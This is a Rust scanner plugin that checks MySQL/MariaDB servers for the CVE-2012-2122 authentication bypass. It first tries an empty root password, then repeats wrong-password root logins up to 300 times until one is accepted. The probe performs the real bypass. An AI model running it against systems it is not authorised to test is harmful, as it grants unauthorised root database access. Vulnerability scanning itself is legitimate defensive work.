/* mysql-vuln-cve2012-2122 - MySQL/MariaDB authentication bypass probe */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    let mut s = match mysql_open(ctx) {
        Some(v) => v,
        None => { set_out(ctx, "MySQL CVE-2012-2122: no MySQL handshake"); return 0; }
    };
    let (rc, _msg) = mysql_login(&mut s.0, "root", "", true);
    drop(s);
    if rc == 0 {
        set_out(ctx, "MySQL CVE-2012-2122: root accepts an empty password (not the memcmp bypass)");
        return 0;
    }
    for i in 0..300 {
        let mut s = match mysql_open(ctx) {
            Some(v) => v,
            None => break,
        };
        let (rc, _msg) = mysql_login(&mut s.0, "root", "x", false);
        let version = s.1.clone();
        drop(s);
        if rc == 0 {
            set_out(ctx, &format!(
                "VULNERABLE: MySQL CVE-2012-2122 auth bypass after {} attempts ({})",
                i + 1, version));
            return 0;
        }
    }
    set_out(ctx, "not vulnerable: MySQL CVE-2012-2122 not triggered");
    0
}
